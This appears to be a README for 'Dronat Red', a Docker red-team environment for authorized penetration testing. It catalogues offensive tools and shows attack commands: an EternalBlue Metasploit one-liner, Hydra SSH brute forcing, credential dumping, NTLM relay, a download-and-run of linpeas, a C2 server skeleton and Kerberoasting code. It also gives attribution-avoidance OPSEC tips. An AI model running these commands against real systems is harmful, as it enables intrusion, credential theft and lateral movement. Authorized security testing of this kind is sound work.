# Dronat Red - Red Team Operations Environment

🚩 **A specialized Docker container for red team operations and offensive security research**

## Overview

Dronat Red is a comprehensive red team operations environment that provides all the tools and frameworks needed for authorized penetration testing, red team exercises, and offensive security research. Built on Ubuntu 24.04 LTS with a focus on operational security and advanced C2 capabilities.

## ⚠️ Important Legal Notice

**FOR AUTHORIZED TESTING AND EDUCATIONAL USE ONLY**

This environment contains powerful offensive security tools that must only be used:
- On systems you own or have explicit written permission to test
- For educational and research purposes in controlled environments  
- In compliance with all applicable laws and regulations
- Following responsible disclosure practices

**Misuse of these tools is illegal and unethical. Users are solely responsible for compliance with all applicable laws.**

## Features

### 🚩 Red Team Operations
- **Full Kill Chain**: Reconnaissance → Initial Access → Persistence → Exfiltration
- **C2 Frameworks**: Empire, Covenant, Metasploit, custom development
- **Persistence Mechanisms**: Multiple techniques for maintaining access
- **Lateral Movement**: Tools for network traversal and privilege escalation
- **Data Exfiltration**: Covert channels and data extraction methods

### 🔍 Reconnaissance & Intelligence
- **Network Discovery**: nmap, masscan, zmap for large-scale scanning
- **Web Reconnaissance**: gobuster, dirb, nikto, aquatone
- **OSINT**: Shodan, Censys, theHarvester, recon-ng
- **DNS Enumeration**: fierce, dnsrecon, subfinder
- **Social Engineering**: Information gathering for targeted attacks

### 🎯 Initial Access & Exploitation
- **Web Application**: SQLMap, Burp Suite extensions, custom exploits
- **Network Services**: Metasploit, custom exploit development
- **Password Attacks**: Hydra, Medusa, John, Hashcat with optimized wordlists
- **Social Engineering**: Gophish, Evilginx2, SET integration
- **Payload Generation**: msfvenom, custom shellcode, obfuscation

### 🕵️ Post-Exploitation & Persistence
- **Privilege Escalation**: LinPEAS, WinPEAS, custom enumeration
- **Persistence**: Multiple techniques across Windows/Linux/macOS
- **Lateral Movement**: PSExec, WMIExec, SSH pivoting
- **Credential Harvesting**: Mimikatz integration, hash dumping
- **Living off the Land**: PowerShell, WMI, legitimate tools abuse

### 🌐 Command & Control (C2)
- **Empire**: PowerShell-based C2 framework
- **Covenant**: .NET-based C2 with advanced features
- **Metasploit**: Multi/handler and custom modules
- **Custom C2**: Development framework for bespoke solutions
- **Communication Channels**: HTTP/S, DNS, SMB, custom protocols

### 🧠 AI/ML Offensive Security
- **Adversarial ML**: Evasion attacks against ML-based defenses
- **AI-Powered Testing**: Automated vulnerability discovery
- **Deepfake Generation**: For advanced social engineering
- **Traffic Analysis**: ML-based network behavior analysis
- **Malware Classification**: Understanding detection mechanisms

### 🔐 Advanced Techniques
- **Active Directory**: Kerberoasting, Golden/Silver Tickets, DCSync
- **Cloud Security**: AWS/Azure/GCP attack techniques
- **Container Escape**: Docker and Kubernetes exploitation
- **Wireless**: WiFi cracking, rogue access points, Bluetooth attacks
- **IoT/Embedded**: Firmware analysis and exploitation

## Quick Start

### Prerequisites
- Docker and Docker Compose installed
- At least 8GB RAM (16GB recommended)
- 50GB free disk space
- Linux host (recommended) or Windows with WSL2

### Building the Environment

```bash
# Clone the repository
git clone https://github.com/xnox-me/dronat-red.git
cd dronat-red

# Build the red team container
docker build -f Dockerfile.red -t dronat-red:latest .
```

### Running Dronat Red

#### Basic Red Team Environment
```bash
# Start the core red team environment
docker-compose -f docker-compose-red.yml up dronat-red
```

#### Full Red Team Infrastructure
```bash
# Start complete infrastructure with C2, phishing, and monitoring
docker-compose -f docker-compose-red.yml \
  --profile database \
  --profile cache \
  --profile c2 \
  --profile phishing \
  --profile monitoring up
```

#### Quick Start Script
```bash
# Use the automated start script
./start-red.sh
```

### Interactive Menu

Once inside the container, you'll have access to the red team operations menu:

1. **📝 Neovim Red Team IDE** - Enhanced editor with offensive security plugins
2. **🔄 n8n Workflow Editor** - Automation for red team operations
3. **💻 Bash Shell** - Direct shell access with all tools
4. **🔍 Reconnaissance & Intelligence** - Information gathering phase
5. **🎯 Initial Access & Exploitation** - Gaining initial foothold
6. **🔐 Credential Access & PrivEsc** - Escalating privileges
7. **🌐 Command & Control (C2)** - Maintaining persistent access
8. **🕵️ Persistence & Lateral Movement** - Expanding access
9. **📡 Collection & Exfiltration** - Data extraction
10. **🎭 Social Engineering** - Human element attacks
11. **🧠 ML/AI Offensive Security** - Advanced AI-powered techniques
12. **🌐 Shellngn Pro** - Web-based C2 interface
13. **🔧 Red Team Utilities** - Supporting tools and utilities
14. **📚 Help & Documentation** - Comprehensive guidance
15. **🚪 Exit** - Secure shutdown

## Red Team Methodology

### Phase 1: Reconnaissance
```bash
# Network discovery
nmap -sn 192.168.1.0/24

# Service enumeration
nmap -sS -sV -sC -O target_ip

# Web reconnaissance
gobuster dir -u http://target -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt

# OSINT gathering
python3 -c "
import shodan
# Shodan API integration for external reconnaissance
"
```

### Phase 2: Initial Access
```bash
# Web application testing
sqlmap -u "http://target/page.php?id=1" --batch --risk=3 --level=5

# Network service exploitation
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; exploit"

# Password attacks
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
```

### Phase 3: Post-Exploitation
```bash
# Privilege escalation enumeration
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Credential dumping
secretsdump.py domain/user:password@target

# Persistence establishment
# Various techniques available in the environment
```

### Phase 4: Lateral Movement
```bash
# Network enumeration
nmap -sS 192.168.1.0/24 -p 22,139,445,3389

# Credential relay attacks
ntlmrelayx.py -t smb://target -c "whoami"

# Remote execution
psexec.py domain/user:password@target
```

### Phase 5: Data Collection & Exfiltration
```bash
# Data discovery
find / -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*" 2>/dev/null

# Covert exfiltration
# DNS exfiltration, steganography, and other covert channels available
```

## Advanced Features

### Custom C2 Development
```python
# Example C2 development framework
import socket
import threading
import base64
from cryptography.fernet import Fernet

class CustomC2Server:
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.clients = []
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[+] C2 Server listening on {self.host}:{self.port}")
        
        while True:
            client, addr = server.accept()
            print(f"[+] New connection from {addr}")
            self.clients.append(client)
            threading.Thread(target=self.handle_client, args=(client,)).start()
```

### AI-Powered Security Testing
```python
# Adversarial ML example
import tensorflow as tf
import numpy as np

def generate_adversarial_example(model, input_data, target_class, epsilon=0.1):
    """Generate adversarial examples to evade ML-based security systems"""
    with tf.GradientTape() as tape:
        tape.watch(input_data)
        prediction = model(input_data)
        loss = tf.keras.losses.categorical_crossentropy(target_class, prediction)
    
    gradient = tape.gradient(loss, input_data)
    adversarial_data = input_data + epsilon * tf.sign(gradient)
    return adversarial_data
```

### Active Directory Attack Simulation
```python
# Kerberoasting example
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket.krb5.types import Principal

def kerberoast_attack(domain, username, password, target_spn):
    """Perform Kerberoasting attack against target SPN"""
    try:
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
            Principal(target_spn), domain, None, None
        )
        return tgs, cipher
    except Exception as e:
        print(f"Kerberoasting failed: {e}")
        return None, None
```

## Port Mappings

| Port | Service | Description |
|------|---------|-------------|
| 8888 | JupyterLab | ML/AI Offensive Security Research |
| 5678 | n8n | Workflow Automation |
| 8080 | Shellngn Pro | Web-based C2 Interface |
| 4444-4445 | Metasploit | Handler ports |
| 5555 | Empire | RESTful API |
| 1337 | Custom C2 | Custom command & control |
| 8000/8443 | HTTP/HTTPS | Payload delivery servers |
| 53 | DNS | DNS exfiltration channel |
| 80/443 | HTTP/HTTPS | Web C2 channels |
| 3333 | Gophish | Phishing campaign management |
| 7443 | Covenant | C2 framework interface |

## Directory Structure

```
/home/devuser/
├── redteam/              # Red team workspace
├── payloads/             # Generated payloads and shellcode
├── loot/                 # Extracted data and credentials
├── reports/              # Operation reports and documentation
├── c2-profiles/          # C2 framework profiles
├── phishing/             # Phishing templates and campaigns
├── custom-wordlists/     # Customized wordlists
├── custom-exploits/      # Custom exploit code
├── Empire/               # Empire C2 framework
├── anaconda3/            # Python environment
└── .config/nvim/         # Neovim configuration
```

## Red Team Tools Reference

### Network Reconnaissance
- **nmap**: Advanced port scanner with NSE scripts
- **masscan**: High-speed Internet-scale port scanner  
- **zmap**: Internet-wide scanning tool
- **aquatone**: Visual domain reconnaissance
- **subfinder**: Fast subdomain discovery

### Web Application Security
- **SQLMap**: Advanced SQL injection testing
- **Burp Suite Extensions**: Professional web testing
- **Gobuster**: Directory and file brute-forcing
- **Nikto**: Web vulnerability scanner
- **Wfuzz**: Web application fuzzer

### Exploitation Frameworks
- **Metasploit**: Comprehensive exploitation framework
- **Empire**: PowerShell post-exploitation agent
- **Covenant**: .NET command and control framework
- **Cobalt Strike Integration**: Commercial C2 platform support

### Post-Exploitation
- **Impacket**: Python classes for network protocols
- **PSExec/WMIExec**: Remote execution techniques
- **Mimikatz Integration**: Windows credential extraction
- **PowerShell Empire**: Windows-focused post-exploitation

### Password & Hash Cracking
- **Hashcat**: Advanced password recovery
- **John the Ripper**: Traditional password cracker
- **Hydra**: Network login cracker
- **CrackMapExec**: Post-exploitation tool suite

### Social Engineering
- **Gophish**: Phishing framework
- **Evilginx2**: Advanced phishing with MFA bypass
- **SET**: Social engineering toolkit
- **Custom templates**: Tailored phishing campaigns

## Security Guidelines

### Operational Security (OPSEC)
- **Always use VPNs or Tor for external reconnaissance**
- **Implement proper logging and attribution avoidance**
- **Use encrypted communications for C2 traffic**
- **Follow proper cleanup procedures**
- **Maintain operational compartmentalization**

### Legal and Ethical Considerations
- **Obtain explicit written authorization before testing**
- **Define clear scope and boundaries**
- **Follow responsible disclosure practices**
- **Document all activities thoroughly**
- **Respect privacy and data protection laws**

### Testing Environment Best Practices
- **Use isolated lab environments for development**
- **Implement proper network segmentation**
- **Monitor resource usage and system performance**
- **Regular backup of important data and configurations**
- **Keep tools and signatures updated**

## Environment Variables

```bash
# Core configuration
POSTGRES_PASSWORD=RedTeam2024!
REDIS_PASSWORD=RedisRed2024!
EMPIRE_PASSWORD=EmpireRed2024!
GOPHISH_PASSWORD=GophishRed2024!

# Database URLs
METASPLOIT_DATABASE_URL=postgresql://msf:password@postgres-red:5432/msf_db
EMPIRE_DB_URL=postgresql://empire:password@postgres-red:5432/empire_db

# C2 Configuration
C2_LISTENER_HOST=0.0.0.0
C2_LISTENER_PORT=1337
```

## Troubleshooting

### Common Issues

1. **Permission denied for network tools**
   ```bash
   # Run with proper privileges
   docker run --privileged --net=host dronat-red
   ```

2. **C2 frameworks not starting**
   ```bash
   # Check database connectivity
   docker-compose logs postgres-red
   
   # Verify environment variables
   env | grep -E "(EMPIRE|MSF|GOPHISH)"
   ```

3. **Port conflicts**
   ```bash
   # Check for conflicting services
   netstat -tuln | grep -E "(4444|5555|8080)"
   
   # Modify docker-compose-red.yml port mappings as needed
   ```

### Performance Optimization

1. **Increase container resources**
   ```yaml
   deploy:
     resources:
       limits:
         memory: 32G
         cpus: '16.0'
   ```

2. **Use SSD storage for volumes**
   ```yaml
   volumes:
     - type: bind
       source: /fast/ssd/path
       target: /home/devuser/redteam
   ```

## Testing the Environment

```bash
# Run comprehensive tests
./test_red_environment.sh

# Test specific components
python3 -c "
import scapy, requests, impacket, pwntools
print('✓ Core security libraries available')
"

# Test C2 frameworks
msfconsole -x "version; exit"
```

## Contributing

To contribute to Dronat Red:

1. Fork the repository
2. Create feature branches for new tools or techniques
3. Test thoroughly in isolated environments
4. Follow responsible disclosure for any vulnerabilities found
5. Submit pull requests with detailed descriptions
6. Maintain operational security throughout development

## Updates and Maintenance

### Updating Red Team Tools
```bash
# Update package databases
sudo apt update

# Update specific tools
sudo apt install --only-upgrade nmap metasploit-framework

# Update Python packages
pip install --upgrade impacket scapy pwntools
```

### Signature and Rule Updates
```bash
# Update Metasploit
msfupdate

# Update wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
```

## License and Disclaimer

This project is provided for educational and authorized security testing purposes only. The developers and contributors:

- **Do not endorse or encourage illegal activities**
- **Are not responsible for misuse of these tools**
- **Strongly advocate for ethical and legal security testing**
- **Support responsible disclosure and coordinated vulnerability disclosure**

Users must comply with all applicable laws, regulations, and organizational policies. Always obtain proper authorization before conducting security assessments.

## Community and Support

- **GitHub Issues**: Report bugs and request features
- **Security Research**: Share findings through responsible disclosure
- **Educational Use**: Contribute tutorials and learning materials
- **Tool Development**: Add new tools and techniques

---

🚩 **Remember: Red team operations require the highest standards of professionalism, ethics, and legal compliance. Use this environment responsibly to improve defensive capabilities and overall security posture.**

**"The best defense is understanding the offense - but only within legal and ethical boundaries."**